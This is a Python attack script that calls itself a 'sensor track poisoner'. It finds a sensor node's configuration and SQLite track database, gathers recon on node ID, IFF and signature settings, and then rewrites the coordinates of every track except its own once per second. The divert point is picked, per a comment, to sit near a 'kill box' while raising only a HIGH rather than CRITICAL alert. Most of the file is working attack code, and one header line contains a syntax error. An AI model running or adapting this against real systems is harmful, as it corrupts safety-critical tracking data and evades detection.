"""
mantis_sensor_fast.py - fast sensor track poisoner.

Focused entirely on SQLite track poisoning. Keeps DB connection open,
uses WAL mode to reduce lock contention, loops every 1s.

Usage:
    python3 mantis_sensor_fast.py                        # auto config, loop
    python3 mantis_sensor_fast.py --recon                # intel only
    python3 mantis_sensor_fast.py --once                 # single shot
    python3 mantis_sensor_fast.py --lat 49.3 --lon -62.1 # custom coords
    SENSOR_CONFIG_PATH=/x/y python3 mantis_sensor_fast.py
"""

import glob
import json
import os
import re
import signal
import sqlite3
import sys
import time

# ============================================================================
#  TUNABLES
# ============================================================================

# Coords ~55km north of kill box centroid.
# Fires GG-T4.1.2 as HIGH (not CRITICAL) — stays under the 200km threshold.
DIVERT_LAT = 49.758
DIVERT_LON = -61.891

LOOP_INTERVAL = 1.0   # seconds between pulses

CONFIG_ENV_KEYS  = ["SENSOR_CONFIG_PATH", "CONFIG_PATH"]
CONFIG_PATHS     = ["/etc/sensor/config.yaml", "/etc/mantis/config.yaml"]
TRACK_DB_PATHS   = [
    "/var/lib/mantis/tracks.db",
    "/var/lib/sensor/tracks.db",
    "/var/lib/sensor/gps.db",
    "/var/lib/mantis/sensor.db",
]

# ============================================================================
#  CONFIG
# ============================================================================

def _scalar(v):
    v = v.strip().strip('"').strip("'")
    if v.lower() in ("true",):  return True
    if v.lower() in ("false",): return False
    try: return int(v)
    except ValueError: pass
    try: return float(v)
    except ValueError: pass
    return v

def load_yaml(path):
    try:
        text = open(path).read()
    except Exception:
        return None
    try:
        import yaml
        return yaml.safe_load(text)
    except Exception:
        pass
    out = {}
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        if ":" in s:
            k, _, v = s.partition(":")
            v = v.strip()
            if v and not v.startswith("#"):
                out[k.strip()] = _scalar(v)
    return out

def find_config(explicit=None):
    candidates = []
    if explicit:
        candidates.append(explicit)
    for k in CONFIG_ENV_KEYS:
        p = os.environ.get(k)
        if p:
            candidates.append(p)
    candidates += CONFIG_PATHS
    candidates += glob.glob("/etc/*/config.yaml")

    for p in candidates:
        cfg = load_yaml(p)
        if not cfg:
            continue
        if "gps_db_path" in cfg or "comms_socket_path" in cfg:
            return cfg, p
    return None, None

# ============================================================================
#  DB
# ============================================================================

def resolve_db(cfg):
    for k in ("gps_db_path", "db_path", "track_db_path"):
        v = cfg.get(k)
        if v and os.path.exists(v):
            return v
    for p in TRACK_DB_PATHS:
        if os.path.exists(p):
            return p
    return None

def open_db(path):
    conn = sqlite3.connect(path, timeout=2.0, check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=2000")
    return conn

def read_tracks(conn):
    try:
        return conn.execute(
            "SELECT track_id, latitude, longitude FROM tracks"
        ).fetchall()
    except Exception:
        return []

def poison(conn, own_iff, lat, lon):
    try:
        total = conn.execute("SELECT COUNT(*) FROM tracks").fetchone()[0]
        if own_iff is not None:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=? WHERE track_id<>?",
                (lat, lon, str(own_iff))
            )
        else:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=?",
                (lat, lon)
            )
        conn.commit()
        return cur.rowcount, total, None
    except sqlite3.OperationalError as e:
        conn.rollback()
        msg = str(e).lower()
        if "locked" in msg or "busy" in msg:
            return 0, 0, "DB locked (hw daemon) — retrying"
        if "readonly" in msg:
            return 0, 0, "DB read-only — check permissions"
        return 0, 0, str(e)
    except Exception as e:
        conn.rollback()
        return 0, 0, str(e)

# ============================================================================
#  RECON
# ============================================================================

def print_recon(cfg, path, db_path):
    sep = "=" * 56
    print(sep)
    print("  MANTIS SENSOR")
    print(sep)
    print(f"Config:     {path}")
    print(f"Node ID:    {cfg.get('id','?')}")
    print(f"IFF:        {cfg.get('iff','?')}")
    print(f"VerifySig:  {cfg.get('verify_signatures','?')}")
    print(f"CommSock:   {cfg.get('comms_socket_path','?')}")
    print(f"GPS DB cfg: {cfg.get('gps_db_path','(not set)')}")
    print(f"GPS DB res: {db_path or 'NOT FOUND'}")

    if not db_path:
        print("\n[!] Track DB not found — divert will fail.")
        print("    Try: ls -la /var/lib/*/tracks.db")
        return

    writable = os.access(db_path, os.W_OK)
    print(f"DB access:  {'WRITABLE' if writable else 'READ-ONLY'}")

    try:
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=1.0)
        tracks = conn.execute(
            "SELECT track_id, latitude, longitude FROM tracks"
        ).fetchall()
        conn.close()
        print(f"Tracks:     {len(tracks)}")
        for tid, lat, lon in tracks:
            print(f"  {str(tid):<36}  {lat:.4f}, {lon:.4f}")
    except Exception as e:
        print(f"DB read:    failed ({e})")
    print()

def save_recon_json(cfg, path, db_path, tracks):
    data = {
        "collected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "config_path":  path,
        "node_type":    "sensor",
        "node_id":      cfg.get("id"),
        "iff":          cfg.get("iff"),
        "gps_db_path":  db_path,
        "track_ids":    [t[0] for t in tracks],
        "verify_signatures": cfg.get("verify_signatures"),
    }
    out = f"/tmp/recon_{cfg.get('id','unknown')}.json"
    try:
        with open(out, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[+] Recon saved: {out}")
    except Exception as e:
        print(f"[!] Could not save recon: {e}")

# ============================================================================
//  MAIN
# ============================================================================

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--config", default=None)
    ap.add_argument("--lat",    type=float, default=DIVERT_LAT)
    ap.add_argument("--lon",    type=float, default=DIVERT_LON)
    ap.add_argument("--once",   action="store_true")
    ap.add_argument("--recon",  action="store_true")
    args = ap.parse_args()

    cfg, cfg_path = find_config(args.config)
    if not cfg:
        print("[!] No sensor config found.")
        print("    Set SENSOR_CONFIG_PATH or use --config")
        sys.exit(2)

    db_path = resolve_db(cfg)
    print_recon(cfg, cfg_path, db_path)

    if args.recon:
        return

    if not db_path:
        print("[!] No track DB. Cannot divert.")
        sys.exit(1)

    conn = open_db(db_path)
    tracks = read_tracks(conn)
    save_recon_json(cfg, cfg_path, db_path, tracks)

    own_iff = cfg.get("iff")
    lat, lon = args.lat, args.lon

    print(f"[*] Divert -> {lat:.4f}, {lon:.4f}")
    print(f"[*] Own IFF (skip): {own_iff!r}")

    if args.once:
        changed, total, err = poison(conn, own_iff, lat, lon)
        if err:
            print(f"[!] {err}")
            sys.exit(1)
        print(f"[+] Poisoned {changed}/{total} tracks")
        conn.close()
        return

    print(f"[*] Looping every {LOOP_INTERVAL}s. Ctrl-C to stop.\n")

    running = True
    def _stop(sig, frame):
        nonlocal running
        running = False
    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    pulse = 0
    while running:
        pulse += 1
        changed, total, err = poison(conn, own_iff, lat, lon)
        if err:
            print(f"  pulse {pulse}: {err}")
        else:
            print(f"  pulse {pulse}: {changed}/{total} poisoned")
        time.sleep(LOOP_INTERVAL)

    print("\n[+] Stopped.")
    conn.close()

if __name__ == "__main__":
    main()